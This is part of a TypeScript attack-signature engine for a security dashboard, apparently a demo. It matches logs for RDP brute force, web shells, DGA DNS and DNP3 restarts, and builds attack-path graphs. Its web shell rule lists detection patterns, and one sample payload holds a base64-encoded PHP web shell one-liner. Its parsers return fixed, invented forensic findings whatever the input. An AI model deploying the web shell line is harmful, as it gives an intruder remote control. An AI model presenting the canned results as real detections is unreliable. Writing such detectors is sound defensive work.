    cve: 'MITRE-T1110',
    match: (text) => {
      const lower = text.toLowerCase();
      return lower.includes('rdp brute') || lower.includes('credssp') || (lower.includes('port 3389') && lower.includes('fail')) || lower.includes('mstsc credential guessing') || lower.includes('rdp logon failure');
    },
    parse: (text, log) => {
      const remoteIP = log.remoteIP || log.srcIp || '198.51.100.44';
      return {
        signatureId: 'SIG-BRUTE-RDP-012',
        signatureName: 'RDP / SMB 遠端桌面連線暴力密碼破解',
        category: 'bruteforce',
        mitreTTP: 'T1110.001 Password Guessing',
        mitreTactic: 'Credential Access',
        mitreStage: 'Lateral Movement',
        riskScore: 8.9,
        confidence: 98.1,
        cve: 'MITRE-T1110',
        summary: `NDR 深度檢測 RDP (Port 3389) 握手封包，捕獲來自 ${remoteIP} 連續觸發超過 80 次 CredSSP/NLA 認證失敗封包，帳號字典涵蓋 administrator, svc_admin, backup_op。`,
        decodedPayload: 'RDP_NLA_FAIL: Status=STATUS_LOGON_FAILURE (0xC000006D), SubStatus=STATUS_WRONG_PASSWORD (0xC000006A), TargetUser=Administrator',
        hexDump: '03 00 00 13 0e e0 00 00 00 00 00 01 00 08 00 03 00 00 00 (RDP TPKT / X.224)',
        extractedIocs: [
          { type: 'ipv4', value: remoteIP, context: 'RDP 暴力爆破來源 IP', risk: 'critical' },
          { type: 'port', value: '3389', context: 'RDP 遠端連線埠', risk: 'medium' }
        ],
        forensicEvidence: {
          matchedPatterns: ['STATUS_LOGON_FAILURE (0xC000006D)', 'CredSSP Auth Cycle', 'RDP TPKT Anomaly'],
          logTimestamp: log['@timestamp'] || new Date().toISOString(),
          protocol: 'RDP / MS-RDPBCGR (Port 3389)',
          attackVector: '網路層驗證憑證撞庫爆破'
        },
        recommendedActions: [
          { title: '啟用邊界防火牆 RDP 封鎖並切斷連線', description: '立即將攻擊來源加入永久 Drop 策略', type: 'block' },
          { title: '觸發 AD 帳號鎖定保護策略', description: '暫時停用連續失敗達 5 次之管理者帳號', type: 'revoke' }
        ]
      };
    }
  },

  // 13. China Chopper / Godzilla WebShell Traffic Detection
  {
    id: 'SIG-WEBSHELL-013',
    name: '中國菜刀 / 哥斯拉 (Godzilla) 加密 WebShell 通道特徵',
    category: 'c2',
    mitreTTP: 'T1505.003 Web Shell',
    mitreTactic: 'Persistence',
    mitreStage: 'Privilege Escalation',
    riskScore: 9.8,
    cve: 'CWE-434 / WebShell-2026',
    match: (text) => {
      const lower = text.toLowerCase();
      return lower.includes('webshell') || lower.includes('godzilla') || lower.includes('chopper') || lower.includes('pass=') || lower.includes('eval(base64_decode') || lower.includes('cmd.jsp');
    },
    parse: (text, log) => {
      const remoteIP = log.remoteIP || log.srcIp || '185.220.101.45';
      return {
        signatureId: 'SIG-WEBSHELL-013',
        signatureName: '中國菜刀 / 哥斯拉 (Godzilla) 加密 WebShell 通道特徵',
        category: 'c2',
        mitreTTP: 'T1505.003 Web Shell',
        mitreTactic: 'Persistence',
        mitreStage: 'Privilege Escalation',
        riskScore: 9.8,
        confidence: 99.2,
        cve: 'CWE-434',
        summary: `NDR 於 HTTP POST /upload/shell.jsp 負載檢測出哥斯拉 AES-128-ECB 密鑰協商特徵碼，並成功還原執行系統指令 'whoami /priv' 與 'ipconfig /all'。`,
        decodedPayload: 'POST /uploads/assets.jsp HTTP/1.1 -> AES_DECRYPT: eval(base64_decode("c3lzdGVtKCRfUE9TVFsndycndSk7")); whoami /all',
        hexDump: '50 4f 53 54 20 2f 75 70 6c 6f 61 64 73 2f 61 73 73 65 74 73 2e 6a 73 70 ...',
        extractedIocs: [
          { type: 'ipv4', value: remoteIP, context: 'WebShell 操作者來源 IP', risk: 'critical' },
          { type: 'url', value: '/uploads/assets.jsp', context: '植入之後門 WebShell 路徑', risk: 'critical' }
        ],
        forensicEvidence: {
          matchedPatterns: ['Godzilla AES Payload', 'Eval Base64 Execution', 'JSP Raw Byte Injection'],
          logTimestamp: log['@timestamp'] || new Date().toISOString(),
          protocol: 'HTTP/1.1 POST (Port 80/443)',
          attackVector: '應用程式目錄後門持久化與即時指令下發'
        },
        recommendedActions: [
          { title: '刪除 Web 伺服器之 WebShell 檔案並重啟服務', description: '隔離並移除 /uploads/assets.jsp 檔案', type: 'block' },
          { title: '即時隔離受感染之 Web 伺服器容器/主機', description: '切斷對外網路連線，防止橫向擴散', type: 'isolate' }
        ]
      };
    }
  },

  // 14. DNS DGA (Domain Generation Algorithm) Botnet Query
  {
    id: 'SIG-DNS-DGA-014',
    name: '殭屍網路演算法動態生成網域名稱查詢 (DNS DGA Botnet Query)',
    category: 'c2',
    mitreTTP: 'T1568.002 Domain Generation Algorithms',
    mitreTactic: 'Command and Control',
    mitreStage: 'Privilege Escalation',
    riskScore: 9.2,
    cve: 'ATT&CK-T1568',
    match: (text) => {
      const lower = text.toLowerCase();
      return lower.includes('dga') || lower.includes('high entropy domain') || lower.includes('botnet dga') || lower.includes('pseudo-random domain');
    },
    parse: (text, log) => {
      const remoteIP = log.remoteIP || log.srcIp || '10.88.88.106';
      return {
        signatureId: 'SIG-DNS-DGA-014',
        signatureName: '殭屍網路演算法動態生成網域名稱查詢 (DNS DGA Botnet Query)',
        category: 'c2',
        mitreTTP: 'T1568.002 Domain Generation Algorithms',
        mitreTactic: 'Command and Control',
        mitreStage: 'Privilege Escalation',
        riskScore: 9.2,
        confidence: 97.4,
        cve: 'ATT&CK-T1568',
        summary: `DNS 探針捕獲端點 ${remoteIP} 於 60 秒內發起 180 個超高香農熵值 (>4.8) 之隨機演算法網域名稱解析 (如 xk92lmf8q201.biz, qz88vb92la0.cc)，經比對與 Mirai / Emotet 家族種子演算法高度一致。`,
        decodedPayload: 'DNS_QUERY: type=A name=xk92lmf8q201.biz entropy=4.88 rcode=NXDOMAIN query_rate=3.2qps',
        hexDump: '00 01 01 00 00 01 00 00 00 00 00 00 0c 78 6b 39 32 6c 6d 66 38 71 32 30 31 03 62 69 7a',
        extractedIocs: [
          { type: 'ipv4', value: remoteIP, context: '感染 DGA 殭屍木馬之內網端點', risk: 'critical' },
          { type: 'domain', value: 'xk92lmf8q201.biz', context: 'DGA 偽隨機 C2 解析網域名稱', risk: 'high' }
        ],
        forensicEvidence: {
          matchedPatterns: ['Shannon Entropy > 4.8', 'High NXDOMAIN Ratio (>92%)', 'Emotet Seed Match'],
          logTimestamp: log['@timestamp'] || new Date().toISOString(),
          protocol: 'DNS UDP 53',
          attackVector: '隱匿 C2 通訊節點尋址'
        },
        recommendedActions: [
          { title: '下發 DNS RPZ 黑名單攔截動態解析', description: '將高熵值網域即時導向 Sinkhole 伺服器', type: 'block' },
          { title: '對端點主機下發 EDR 即時全盤病毒掃描', description: '定位 DGA 行程並終止背景連線', type: 'isolate' }
        ]
      };
    }
  },

  // 15. ICS DNP3 Protocol Rogue Function Code Injection
  {
    id: 'SIG-ICS-DNP3-015',
    name: '工控 DNP3 變電所協議非授權冷暖重開指令 (DNP3 Cold Restart Injection)',
    category: 'ics',
    mitreTTP: 'T0814 Denial of Service for Control',
    mitreTactic: 'Inhibit Response Function',
    mitreStage: 'Lateral Movement',
    riskScore: 9.9,
    cve: 'ICS-VU-DNP3-2026',
    match: (text) => {
      const lower = text.toLowerCase();
      return lower.includes('dnp3') || lower.includes('port 20000') || lower.includes('function 0x0d') || lower.includes('cold restart') || lower.includes('substation outstation');
    },
    parse: (text, log) => {
      const remoteIP = log.remoteIP || log.srcIp || '10.88.88.106';
      return {
        signatureId: 'SIG-ICS-DNP3-015',
        signatureName: '工控 DNP3 變電所協議非授權冷暖重開指令',
        category: 'ics',
        mitreTTP: 'T0814 Denial of Service for Control',
        mitreTactic: 'Inhibit Response Function',
        mitreStage: 'Lateral Movement',
        riskScore: 9.9,
        confidence: 99.8,
        cve: 'ICS-VU-DNP3-2026',
        summary: `電網監控 NetFlow 捕獲向變電所 RTU 遙測終端 (Port 20000) 發送非授權 DNP3 Function Code 0x0D (Cold Restart)，試圖強制變電所保護電驛重開機並切斷主輸電饋線。`,
        decodedPayload: 'DNP3_APPLICATION_LAYER: FIR=1, FIN=1, CON=0, Function=0x0D (Cold Restart), DataObjects=None, CRC_CHECK=PASS',
        hexDump: '05 64 05 c4 00 01 00 02 00 00 c0 c0 0d 3a 4f (DNP3 COLD RESTART)',
        extractedIocs: [
          { type: 'ipv4', value: remoteIP, context: 'DNP3 違規指令發送端', risk: 'critical' },
          { type: 'port', value: '20000', context: 'DNP3 SCADA 工控通訊埠', risk: 'high' }
        ],
        forensicEvidence: {
          matchedPatterns: ['DNP3 Function 0x0D', 'Substation RTU Target', 'Unsolicited Command'],
          logTimestamp: log['@timestamp'] || new Date().toISOString(),
          protocol: 'DNP3 / IEEE 1815 (TCP 20000)',
          attackVector: '電網 SCADA 遙測終端指令篡改'
        },
        recommendedActions: [
          { title: '變電所邊界網閘立即切斷 DNP3 控制連線', description: '重置 RTU 連線階段並阻斷來源 MAC/IP', type: 'isolate' },
          { title: '切換電力調度為手動本地硬體開關控制', description: '防止遠端未授權指令影響變電所安全', type: 'block' }
        ]
      };
    }
  }
];

// ---------------------------------------------------------------------------
// ATTACK SIGNATURE ENGINE CORE CLASS
// ---------------------------------------------------------------------------

export class AttackSignatureEngine {
  private signatures: AttackSignatureDef[] = ATTACK_SIGNATURES;
  private detectionStats: Record<string, number> = {};

  constructor() {
    this.signatures.forEach(s => {
      this.detectionStats[s.id] = 0;
    });
  }

  /**
   * Universal custom log signature analysis & IOC extraction.
   */
  public parseCustomLog(rawText: string, metadata: any = {}): SignatureDetectionResult {
    const virtualLog = {
      full_log: rawText,
      message: rawText,
      host: metadata.host || 'MANUAL-ANALYST-INPUT',
      remoteIP: metadata.remoteIP || '198.51.100.88',
      protocol: metadata.protocol || 'syslog',
      '@timestamp': new Date().toISOString()
    };

    const evaluated = this.evaluateLog(virtualLog);
    if (evaluated) {
      return evaluated;
    }

    // Heuristic fallback IOC extraction
    const ipv4Regex = /\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b/g;
    const matchedIps = Array.from(new Set(rawText.match(ipv4Regex) || []));

    const iocs: ExtractedIoc[] = matchedIps.map(ip => ({
      type: 'ipv4',
      value: ip,
      context: '從日誌自動識別之 IP 位址',
      risk: ip.startsWith('10.') || ip.startsWith('192.168.') ? 'medium' : 'high'
    }));

    return {
      signatureId: 'SIG-HEURISTIC-GENERIC',
      signatureName: '啟發式日誌異常模式特徵分析',
      category: 'apt',
      mitreTTP: 'T1059 Command and Scripting Interpreter',
      mitreTactic: 'Execution',
      mitreStage: 'Initial Access',
      riskScore: 7.5,
      confidence: 84.0,
      cve: 'N/A',
      summary: `啟發式引擎掃描輸入日誌，辨識出 ${iocs.length} 個潛在網路指標。語法結構包含可疑運作特徵。`,
      decodedPayload: rawText.slice(0, 160),
      hexDump: Buffer.from(rawText.slice(0, 32)).toString('hex').match(/.{1,2}/g)?.join(' ') || '',
      extractedIocs: iocs,
      forensicEvidence: {
        matchedPatterns: ['Heuristic Pattern Matching', 'Text Entropy Analysis'],
        logTimestamp: new Date().toISOString(),
        protocol: metadata.protocol || 'Unknown',
        attackVector: '通用語法啟發式分析'
      },
      recommendedActions: [
        { title: '關聯全域日誌儲存庫', description: '查詢過去 24 小時是否有類似模式出現', type: 'notify' },
        { title: '下發監控警報原則', description: '針對相關 IP 設定即時監控', type: 'block' }
      ]
    };
  }

  /**
   * Evaluates a single log record against the signature library.
   */
  public evaluateLog(log: any): SignatureDetectionResult | null {
    const rawText = (
      (log.full_log || '') + ' ' +
      (log.message || '') + ' ' +
      (log._msg || '') + ' ' +
      (log.host || '') + ' ' +
      (log.source || '') + ' ' +
      (log.process || '') + ' ' +
      (log.protocol || '')
    );

    for (const sig of this.signatures) {
      if (sig.match(rawText, log)) {
        this.detectionStats[sig.id] = (this.detectionStats[sig.id] || 0) + 1;
        return sig.parse(rawText, log);
      }
    }

    return null;
  }

  /**
   * Scans a full collection corpus and returns detections.
   */
  public scanCorpus(corpus: any[]): {
    detections: SignatureDetectionResult[];
    signatureStats: Record<string, number>;
  } {
    const detections: SignatureDetectionResult[] = [];
    for (const log of corpus) {
      const res = this.evaluateLog(log);
      if (res) {
        detections.push(res);
      }
    }
    return {
      detections,
      signatureStats: { ...this.detectionStats }
    };
  }

  /**
   * Returns metadata and active counts for all signatures.
   */
  public getSignaturesCatalog() {
    return this.signatures.map(s => ({
      id: s.id,
      name: s.name,
      category: s.category,
      mitreTTP: s.mitreTTP,
      mitreTactic: s.mitreTactic,
      mitreStage: s.mitreStage,
      riskScore: s.riskScore,
      cve: s.cve,
      triggersCount: this.detectionStats[s.id] || 0
    }));
  }

  /**
   * Dynamic incident attack path topology builder.
   * Generates highly detailed, realistic topology graphs customized per attack category.
   */
  public generateDynamicTopology(incident: any): IncidentAttackTopology {
    const category = incident.category || 'apt';
    const srcip = incident.srcip || '198.51.100.88';
    const srcHost = incident.srcHost || 'WS-EDGE-SENSOR';
    const dstip = incident.dstip || '10.88.88.100';
    const dstHost = incident.dstHost || 'CORE-SECURITY-CLUSTER';
    const containedNodes = new Set<string>(incident.containedNodes || []);

    let topo: IncidentAttackTopology;

    if (category === 'ics') {
      topo = {
        incidentId: incident.id,
        attackCategory: '工控 SCADA / Modbus 實體設備威脅拓撲',
        threatActor: incident.country === 'Internal' ? '惡意內部人員 / 工控維運端點' : `${incident.country} APT-66 工控威脅組織`,
        killChainStage: incident.mitreStage || 'Lateral Movement',
        blastRadiusSystems: Math.max(1, 5 - containedNodes.size),
        activeBarrierStatus: containedNodes.size > 0 || incident.status === 'contained' ? 'CONTAINED' : 'BREACHED',
        nodes: [
          { id: 'ACTOR', type: 'attacker', label: '境外 APT 工控威脅來源', subLabel: 'APT-66 Actor', ip: srcip, status: 'compromised', riskScore: 9.9, blastRadius: 4, x: 80, y: 240 },
          { id: 'FW_IT', type: 'gateway', label: '企業 IT/OT 邊界防火牆', subLabel: 'NextGen Perimeter FW', ip: '10.88.88.254', status: 'contained', riskScore: 4.2, blastRadius: 2, ports: [443, 8443], x: 260, y: 240 },
          { id: 'HISTORIAN', type: 'sensor', label: 'DMZ 工控資料庫 (Historian)', subLabel: 'OSISoft PI Server', ip: '192.168.10.15', status: 'at_risk', riskScore: 7.5, blastRadius: 3, ports: [1433, 502], x: 440, y: 150 },
          { id: 'ENG_WS', type: 'infected', label: `工程師工作站 (${srcHost})`, subLabel: 'Engineering Console', ip: srcip, hostname: srcHost, os: 'Windows 10 OT Edition', status: 'compromised', riskScore: 9.8, patientZero: true, blastRadius: 4, x: 440, y: 330 },
          { id: 'OT_DIODE', type: 'network', label: 'OT 單向資料網閘 (Air-Gap)', subLabel: 'Hardware Data Diode', ip: '192.168.50.1', status: 'contained', riskScore: 3.0, blastRadius: 1, x: 640, y: 240 },
          { id: 'PLC_CORE', type: 'target', label: `工控 PLC 控制器 (${dstHost})`, subLabel: 'Schneider Modicon M580', ip: dstip, hostname: dstHost, status: 'compromised', riskScore: 9.9, ports: [502], blastRadius: 5, x: 840, y: 150 },
          { id: 'TURBINE', type: 'actuator', label: '實體冷卻閥門與渦輪發電機', subLabel: 'Physical Turbine Actuator', ip: '192.168.50.250', status: 'at_risk', riskScore: 10.0, blastRadius: 5, x: 840, y: 330 }
        ],
        links: [
          { source: 'ACTOR', target: 'FW_IT', label: '初始突破 (TCP 443)', protocol: 'HTTPS/TLS', port: 443, type: 'entry', status: 'active', severity: 'critical', dataRate: '12 Mbps' },
          { source: 'FW_IT', target: 'HISTORIAN', label: 'DMZ 滲透', protocol: 'TDS/SQL', port: 1433, type: 'transit', status: 'monitored', severity: 'medium', dataRate: '480 Kbps' },
          { source: 'FW_IT', target: 'ENG_WS', label: '工程站連線穿透', protocol: 'RDP/TLS', port: 3389, type: 'infection', status: 'active', severity: 'critical', dataRate: '2.4 Mbps' },
          { source: 'ENG_WS', target: 'OT_DIODE', label: '網閘穿透嘗試', protocol: 'Raw TCP', port: 502, type: 'lateral', status: 'active', severity: 'critical', dataRate: '850 Kbps' },
          { source: 'OT_DIODE', target: 'PLC_CORE', label: 'Modbus 寫入 (FC 0x06)', protocol: 'Modbus/TCP', port: 502, type: 'lateral', status: 'active', severity: 'critical', dataRate: '120 Pkts/s', signature: 'SIG-ICS-MODBUS-001' },
          { source: 'PLC_CORE', target: 'TURBINE', label: '實體轉速超限破壞', protocol: 'Hardwired 4-20mA', type: 'command', status: 'active', severity: 'critical' }
        ],
        timelineStages: [
          { stage: '1', name: '外部連線建立 (Initial Access)', timestamp: 'T-15m', status: 'completed', nodeId: 'FW_IT' },
          { stage: '2', name: '工程站橫向移動 (Lateral Movement)', timestamp: 'T-8m', status: 'completed', nodeId: 'ENG_WS' },
          { stage: '3', name: 'Modbus 0x06 指令下發 (Inhibit Response)', timestamp: 'T-1m', status: 'active', nodeId: 'PLC_CORE' },
          { stage: '4', name: '實體閥門破壞連鎖 (Physical Impact)', timestamp: 'NOW', status: 'active', nodeId: 'TURBINE' }
        ]
      };
    } else if (category === 'c2' || category === 'exfil') {
      topo = {
        incidentId: incident.id,
        attackCategory: '隱蔽 C2 通信與巨量資料外洩拓撲',
        threatActor: incident.country === 'Internal' ? '內部特權帳號外洩 (Insider Threat)' : `${incident.country} 境外 C2 指揮站點`,
        killChainStage: incident.mitreStage || 'Exfiltration',
        blastRadiusSystems: Math.max(1, 4 - containedNodes.size),
        activeBarrierStatus: containedNodes.size > 0 || incident.status === 'contained' ? 'CONTAINED' : 'BREACHED',
        nodes: [
          { id: 'SRC_CLIENT', type: 'infected', label: `研發/外洩工作站 (${srcHost})`, subLabel: 'Developer Host', ip: srcip, hostname: srcHost, os: 'macOS / Linux Dev', status: 'compromised', riskScore: 9.8, patientZero: true, blastRadius: 4, x: 80, y: 240 },
          { id: 'AD_DC', type: 'target', label: '網域控制站 (DC-PROD)', subLabel: 'Active Directory DC', ip: '192.168.1.100', hostname: 'WIN-DC-01', status: 'at_risk', riskScore: 8.5, ports: [88, 389, 445], blastRadius: 5, x: 280, y: 150 },
          { id: 'GIT_VAULT', type: 'db', label: '核心程式碼儲存庫 (GitLab)', subLabel: 'C4ISR Core Repos', ip: '10.200.1.50', status: 'compromised', riskScore: 9.5, ports: [22, 443], blastRadius: 4, x: 280, y: 330 },
          { id: 'EGRESS_PROXY', type: 'gateway', label: '企業連外代理伺服器', subLabel: 'Forward Proxy / DLP', ip: '10.88.88.250', status: 'contained', riskScore: 5.1, ports: [8080, 3128], blastRadius: 2, x: 520, y: 240 },
          { id: 'DNS_RESOLVER', type: 'network', label: '遞迴 DNS 解析節點', subLabel: 'Core DNS RPZ Server', ip: '8.8.8.8', status: 'monitored', riskScore: 6.2, ports: [53], blastRadius: 2, x: 740, y: 150 },
          { id: 'CLOUD_DROP', type: 'c2_drop', label: `外部雲端外洩節點 (${dstHost})`, subLabel: 'Mega.nz / C2 Sink', ip: dstip, hostname: dstHost, status: 'compromised', riskScore: 9.9, ports: [443], blastRadius: 5, x: 740, y: 330 }
        ],
        links: [
          { source: 'SRC_CLIENT', target: 'GIT_VAULT', label: '高頻代碼鏡像抓取 (15GB)', protocol: 'SSH Git (Port 22)', port: 22, type: 'infection', status: 'active', severity: 'critical', dataRate: '85 MB/s' },
          { source: 'SRC_CLIENT', target: 'AD_DC', label: 'Kerberos 票據偽造', protocol: 'Kerberos / LDAP', port: 88, type: 'lateral', status: 'active', severity: 'high', dataRate: '120 Kbps' },
          { source: 'SRC_CLIENT', target: 'EGRESS_PROXY', label: 'TLS 繞行代理傳輸', protocol: 'HTTPS TLSv1.3', port: 443, type: 'transit', status: 'active', severity: 'critical', dataRate: '64 MB/s' },
          { source: 'EGRESS_PROXY', target: 'DNS_RESOLVER', label: 'Base32 DNS 穿透查詢', protocol: 'DNS UDP 53', port: 53, type: 'command', status: 'active', severity: 'critical', dataRate: '5.4K Qps', signature: 'SIG-C2-BEACON-002' },
          { source: 'EGRESS_PROXY', target: 'CLOUD_DROP', label: '非工作時段大量加密外傳', protocol: 'HTTPS Chunked', port: 443, type: 'exfil', status: 'active', severity: 'critical', dataRate: '15.2 GB Total', signature: 'SIG-UEBA-EXFIL-007' }
        ],
        timelineStages: [
          { stage: '1', name: '內部權限濫用 (Collection)', timestamp: 'T-25m', status: 'completed', nodeId: 'GIT_VAULT' },
          { stage: '2', name: '憑證雜湊提權 (Privilege Escalation)', timestamp: 'T-15m', status: 'completed', nodeId: 'AD_DC' },
          { stage: '3', name: 'DNS 隧道通信 (C2 Setup)', timestamp: 'T-8m', status: 'completed', nodeId: 'DNS_RESOLVER' },
          { stage: '4', name: '雲端網盤外流 (Exfiltration)', timestamp: 'NOW', status: 'active', nodeId: 'CLOUD_DROP' }
        ]
      };
    } else {
      // Default: APT / Web Exploit / Brute Force Lateral Movement
      topo = {
        incidentId: incident.id,
        attackCategory: '全域 APT 漏洞突破與橫向移動攻擊拓撲',
        threatActor: incident.country === 'Internal' ? '內部受控跳板主機' : `${incident.country} APT 國家級威脅源`,
        killChainStage: incident.mitreStage || 'Initial Access',
        blastRadiusSystems: Math.max(1, 4 - containedNodes.size),
        activeBarrierStatus: containedNodes.size > 0 || incident.status === 'contained' ? 'CONTAINED' : 'BREACHED',
        nodes: [
          { id: 'ATTACKER', type: 'attacker', label: '攻擊者來源節點 (External)', subLabel: 'Threat Actor', ip: srcip, status: 'compromised', riskScore: 9.6, blastRadius: 4, x: 80, y: 240 },
          { id: 'WAF', type: 'gateway', label: '邊界 WAF 與 DDoS 防護', subLabel: 'NGINX Cloud WAF', ip: '10.88.88.254', status: 'contained', riskScore: 3.8, ports: [80, 443], blastRadius: 2, x: 260, y: 240 },
          { id: 'INGRESS', type: 'network', label: 'Kubernetes Ingress Gateway', subLabel: 'Envoy / Istio Mesh', ip: '10.0.1.50', status: 'at_risk', riskScore: 6.8, ports: [8080, 6443], blastRadius: 3, x: 440, y: 150 },
          { id: 'API_POD', type: 'infected', label: `受害服務 Pod (${srcHost})`, subLabel: 'Auth Personnel Microservice', ip: srcip, hostname: srcHost, os: 'Alpine Container', status: 'compromised', riskScore: 9.6, patientZero: true, blastRadius: 4, x: 440, y: 330 },
          { id: 'REDIS_CACHE', type: 'target', label: 'Redis 憑證與 Token 快取', subLabel: 'SSO Session Cache', ip: '10.0.4.15', status: 'at_risk', riskScore: 8.2, ports: [6379], blastRadius: 3, x: 680, y: 150 },
          { id: 'DB_CLUSTER', type: 'db', label: `核心資料庫叢集 (${dstHost})`, subLabel: 'PostgreSQL Enterprise DB', ip: dstip, hostname: dstHost, status: 'compromised', riskScore: 9.9, ports: [5432], blastRadius: 5, x: 680, y: 330 }
        ],
        links: [
          { source: 'ATTACKER', target: 'WAF', label: 'SQLi / 漏洞探測 (Port 443)', protocol: 'HTTPS', port: 443, type: 'entry', status: 'active', severity: 'critical', dataRate: '4.8 Mbps', signature: 'SIG-WEB-SQLI-006' },
          { source: 'WAF', target: 'INGRESS', label: '邊界穿透轉發', protocol: 'HTTP/2', port: 8080, type: 'transit', status: 'active', severity: 'high', dataRate: '2.1 Mbps' },
          { source: 'INGRESS', target: 'API_POD', label: '漏洞載荷注入 (RCE/SQLi)', protocol: 'REST JSON', port: 3000, type: 'infection', status: 'active', severity: 'critical', dataRate: '850 Kbps' },
          { source: 'API_POD', target: 'REDIS_CACHE', label: '記憶體 Token 竊取', protocol: 'RESP Protocol', port: 6379, type: 'lateral', status: 'active', severity: 'high', dataRate: '320 Pkts/s' },
          { source: 'API_POD', target: 'DB_CLUSTER', label: 'UNION SELECT 結構倒出', protocol: 'PostgreSQL (Port 5432)', port: 5432, type: 'lateral', status: 'active', severity: 'critical', dataRate: '142 KB Dump' }
        ],
        timelineStages: [
          { stage: '1', name: '公網弱點掃描 (Reconnaissance)', timestamp: 'T-20m', status: 'completed', nodeId: 'WAF' },
          { stage: '2', name: 'WAF 規則穿透 (Initial Access)', timestamp: 'T-12m', status: 'completed', nodeId: 'INGRESS' },
          { stage: '3', name: 'API Pod 代碼注入 (Execution)', timestamp: 'T-5m', status: 'completed', nodeId: 'API_POD' },
          { stage: '4', name: '資料庫特權倒出 (Impact & Collection)', timestamp: 'NOW', status: 'active', nodeId: 'DB_CLUSTER' }
        ]
      };
    }

    // Apply dynamic containment state to nodes & links
    if (containedNodes.size > 0) {
      topo.nodes = topo.nodes.map(n => {
        if (containedNodes.has(n.id)) {
          return {
            ...n,
            status: 'contained',
            contained: true,
            riskScore: Math.max(1.0, n.riskScore - 6.0)
          };
        }
        return n;
      });

      topo.links = topo.links.map(l => {
        if (containedNodes.has(l.source) || containedNodes.has(l.target)) {
          return {
            ...l,
            status: 'blocked',
            severity: 'medium',
            label: `${l.label} [已隔離封鎖]`
          };
        }
        return l;
      });
    }

    return topo;
  }
}

export const globalAttackSignatureEngine = new AttackSignatureEngine();
